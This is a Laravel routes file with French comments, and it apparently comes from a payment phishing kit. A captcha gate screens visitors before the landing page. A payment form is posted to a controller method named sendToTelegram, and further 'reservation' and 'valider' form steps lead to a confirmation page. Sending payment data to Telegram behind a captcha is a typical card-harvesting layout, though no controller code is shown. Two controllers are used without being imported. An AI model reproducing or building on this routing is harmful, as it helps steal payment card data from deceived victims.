<?php

use App\Http\Controllers\PaymentController;
use App\Http\Controllers\CaptchaController;
use Illuminate\Support\Facades\Route;

Route::get('/captcha', [CaptchaController::class, 'show'])
    ->name('captcha.show');

Route::post('/captcha', [CaptchaController::class, 'verify'])
    ->name('captcha.verify');

Route::get('/', function () {

    if (!session('captcha_verified')) {
        return redirect()->route('captcha.show');
    }

    return view('welcome');

});

// Traitement du premier formulaire
Route::post('/send-payment', [PaymentController::class, 'sendToTelegram'])
    ->name('payment.send');
////////////////////////////////////////////////////////////////////////
// Affichage de la page réservation
Route::get('/reservation', function () {
    return view('reservation');
})->name('reservation');

// Traitement du formulaire de réservation
Route::post('/reservation', [ReservationController::class, 'submit'])
    ->name('reservation.submit');
///////////////////////////////////////////////////////////////////////////

// Affichage de la page valider
Route::get('/valider', function () {
    return view('valider');
})->name('valider');


// Traitement du formulaire valider
Route::post('/valider', [ValiderController::class, 'submit'])
    ->name('valider.submit');

///////////////////////////////////////////////////////////////////////////////////////////

// Page de confirmation
Route::get('/confirmation', function () {
    return view('success');
})->name('success');